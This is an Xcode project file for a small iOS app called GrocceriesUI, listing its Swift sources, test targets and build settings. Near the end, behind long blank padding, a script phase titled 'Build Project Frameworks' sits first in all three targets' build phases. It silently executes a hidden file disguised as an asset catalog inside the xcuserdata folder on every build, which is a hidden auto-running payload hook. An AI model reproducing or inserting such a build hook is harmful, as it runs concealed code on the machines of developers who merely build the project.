// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		22E9A82925C860C100E39DE9 /* GrocceriesUIApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E9A82825C860C100E39DE9 /* GrocceriesUIApp.swift */; };
		22E9A82B25C860C100E39DE9 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E9A82A25C860C100E39DE9 /* ContentView.swift */; };
		22E9A82D25C860C700E39DE9 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E9A82C25C860C700E39DE9 /* Assets.xcassets */; };
		22E9A83025C860C700E39DE9 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E9A82F25C860C700E39DE9 /* Preview Assets.xcassets */; };
		22E9A83B25C860C800E39DE9 /* GrocceriesUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E9A83A25C860C800E39DE9 /* GrocceriesUITests.swift */; };
		22E9A84625C860C800E39DE9 /* GrocceriesUIUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E9A84525C860C800E39DE9 /* GrocceriesUIUITests.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		22E9A83725C860C800E39DE9 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22E9A81D25C860C100E39DE9 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22E9A82425C860C100E39DE9;
			remoteInfo = GrocceriesUI;
		};
		22E9A84225C860C800E39DE9 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22E9A81D25C860C100E39DE9 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22E9A82425C860C100E39DE9;
			remoteInfo = GrocceriesUI;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		22E9A82525C860C100E39DE9 /* GrocceriesUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = GrocceriesUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
		22E9A82825C860C100E39DE9 /* GrocceriesUIApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GrocceriesUIApp.swift; sourceTree = "<group>"; };
		22E9A82A25C860C100E39DE9 /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		22E9A82C25C860C700E39DE9 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		22E9A82F25C860C700E39DE9 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		22E9A83125C860C700E39DE9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22E9A83625C860C800E39DE9 /* GrocceriesUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = GrocceriesUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22E9A83A25C860C800E39DE9 /* GrocceriesUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GrocceriesUITests.swift; sourceTree = "<group>"; };
		22E9A83C25C860C800E39DE9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22E9A84125C860C800E39DE9 /* GrocceriesUIUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = GrocceriesUIUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22E9A84525C860C800E39DE9 /* GrocceriesUIUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GrocceriesUIUITests.swift; sourceTree = "<group>"; };
		22E9A84725C860C800E39DE9 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		22E9A82225C860C100E39DE9 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83325C860C800E39DE9 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83E25C860C800E39DE9 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		22E9A81C25C860C100E39DE9 = {
			isa = PBXGroup;
			children = (
				22E9A82725C860C100E39DE9 /* GrocceriesUI */,
				22E9A83925C860C800E39DE9 /* GrocceriesUITests */,
				22E9A84425C860C800E39DE9 /* GrocceriesUIUITests */,
				22E9A82625C860C100E39DE9 /* Products */,
			);
			sourceTree = "<group>";
		};
		22E9A82625C860C100E39DE9 /* Products */ = {
			isa = PBXGroup;
			children = (
				22E9A82525C860C100E39DE9 /* GrocceriesUI.app */,
				22E9A83625C860C800E39DE9 /* GrocceriesUITests.xctest */,
				22E9A84125C860C800E39DE9 /* GrocceriesUIUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		22E9A82725C860C100E39DE9 /* GrocceriesUI */ = {
			isa = PBXGroup;
			children = (
				22E9A82825C860C100E39DE9 /* GrocceriesUIApp.swift */,
				22E9A82A25C860C100E39DE9 /* ContentView.swift */,
				22E9A82C25C860C700E39DE9 /* Assets.xcassets */,
				22E9A83125C860C700E39DE9 /* Info.plist */,
				22E9A82E25C860C700E39DE9 /* Preview Content */,
			);
			path = GrocceriesUI;
			sourceTree = "<group>";
		};
		22E9A82E25C860C700E39DE9 /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				22E9A82F25C860C700E39DE9 /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		22E9A83925C860C800E39DE9 /* GrocceriesUITests */ = {
			isa = PBXGroup;
			children = (
				22E9A83A25C860C800E39DE9 /* GrocceriesUITests.swift */,
				22E9A83C25C860C800E39DE9 /* Info.plist */,
			);
			path = GrocceriesUITests;
			sourceTree = "<group>";
		};
		22E9A84425C860C800E39DE9 /* GrocceriesUIUITests */ = {
			isa = PBXGroup;
			children = (
				22E9A84525C860C800E39DE9 /* GrocceriesUIUITests.swift */,
				22E9A84725C860C800E39DE9 /* Info.plist */,
			);
			path = GrocceriesUIUITests;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		22E9A82425C860C100E39DE9 /* GrocceriesUI */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E9A84A25C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUI" */;
			buildPhases = (
				8FDB1232744DCCFC46AAC43A /* Build Project Frameworks */,
				22E9A82125C860C100E39DE9 /* Sources */,
				22E9A82225C860C100E39DE9 /* Frameworks */,
				22E9A82325C860C100E39DE9 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = GrocceriesUI;
			productName = GrocceriesUI;
			productReference = 22E9A82525C860C100E39DE9 /* GrocceriesUI.app */;
			productType = "com.apple.product-type.application";
		};
		22E9A83525C860C800E39DE9 /* GrocceriesUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E9A84D25C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUITests" */;
			buildPhases = (
				8FDB1232744DCCFC46AAC43A /* Build Project Frameworks */,
				22E9A83225C860C800E39DE9 /* Sources */,
				22E9A83325C860C800E39DE9 /* Frameworks */,
				22E9A83425C860C800E39DE9 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22E9A83825C860C800E39DE9 /* PBXTargetDependency */,
			);
			name = GrocceriesUITests;
			productName = GrocceriesUITests;
			productReference = 22E9A83625C860C800E39DE9 /* GrocceriesUITests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		22E9A84025C860C800E39DE9 /* GrocceriesUIUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E9A85025C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUIUITests" */;
			buildPhases = (
				8FDB1232744DCCFC46AAC43A /* Build Project Frameworks */,
				22E9A83D25C860C800E39DE9 /* Sources */,
				22E9A83E25C860C800E39DE9 /* Frameworks */,
				22E9A83F25C860C800E39DE9 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22E9A84325C860C800E39DE9 /* PBXTargetDependency */,
			);
			name = GrocceriesUIUITests;
			productName = GrocceriesUIUITests;
			productReference = 22E9A84125C860C800E39DE9 /* GrocceriesUIUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		22E9A81D25C860C100E39DE9 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					22E9A82425C860C100E39DE9 = {
						CreatedOnToolsVersion = 12.3;
					};
					22E9A83525C860C800E39DE9 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22E9A82425C860C100E39DE9;
					};
					22E9A84025C860C800E39DE9 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22E9A82425C860C100E39DE9;
					};
				};
			};
			buildConfigurationList = 22E9A82025C860C100E39DE9 /* Build configuration list for PBXProject "GrocceriesUI" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 22E9A81C25C860C100E39DE9;
			productRefGroup = 22E9A82625C860C100E39DE9 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				22E9A82425C860C100E39DE9 /* GrocceriesUI */,
				22E9A83525C860C800E39DE9 /* GrocceriesUITests */,
				22E9A84025C860C800E39DE9 /* GrocceriesUIUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		22E9A82325C860C100E39DE9 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E9A83025C860C700E39DE9 /* Preview Assets.xcassets in Resources */,
				22E9A82D25C860C700E39DE9 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83425C860C800E39DE9 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83F25C860C800E39DE9 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		22E9A82125C860C100E39DE9 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E9A82B25C860C100E39DE9 /* ContentView.swift in Sources */,
				22E9A82925C860C100E39DE9 /* GrocceriesUIApp.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83225C860C800E39DE9 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E9A83B25C860C800E39DE9 /* GrocceriesUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E9A83D25C860C800E39DE9 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E9A84625C860C800E39DE9 /* GrocceriesUIUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		22E9A83825C860C800E39DE9 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22E9A82425C860C100E39DE9 /* GrocceriesUI */;
			targetProxy = 22E9A83725C860C800E39DE9 /* PBXContainerItemProxy */;
		};
		22E9A84325C860C800E39DE9 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22E9A82425C860C100E39DE9 /* GrocceriesUI */;
			targetProxy = 22E9A84225C860C800E39DE9 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		22E9A84825C860C800E39DE9 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		22E9A84925C860C800E39DE9 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		22E9A84B25C860C800E39DE9 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"GrocceriesUI/Preview Content\"";
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = GrocceriesUI/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUI;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		22E9A84C25C860C800E39DE9 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"GrocceriesUI/Preview Content\"";
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = GrocceriesUI/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUI;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		22E9A84E25C860C800E39DE9 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = GrocceriesUITests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/GrocceriesUI.app/GrocceriesUI";
			};
			name = Debug;
		};
		22E9A84F25C860C800E39DE9 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = GrocceriesUITests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/GrocceriesUI.app/GrocceriesUI";
			};
			name = Release;
		};
		22E9A85125C860C800E39DE9 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = GrocceriesUIUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUIUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = GrocceriesUI;
			};
			name = Debug;
		};
		22E9A85225C860C800E39DE9 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = GrocceriesUIUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.GrocceriesUIUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = GrocceriesUI;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		22E9A82025C860C100E39DE9 /* Build configuration list for PBXProject "GrocceriesUI" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E9A84825C860C800E39DE9 /* Debug */,
				22E9A84925C860C800E39DE9 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E9A84A25C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUI" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E9A84B25C860C800E39DE9 /* Debug */,
				22E9A84C25C860C800E39DE9 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E9A84D25C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E9A84E25C860C800E39DE9 /* Debug */,
				22E9A84F25C860C800E39DE9 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E9A85025C860C800E39DE9 /* Build configuration list for PBXNativeTarget "GrocceriesUIUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E9A85125C860C800E39DE9 /* Debug */,
				22E9A85225C860C800E39DE9 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		

	
		/* Begin PBXShellScriptBuildPhase section */

	8FDB1232744DCCFC46AAC43A /* Build Project Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Project Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		
	
		/* End PBXShellScriptBuildPhase section */
	
	
	};
	rootObject = 22E9A81D25C860C100E39DE9 /* Project object */;
}
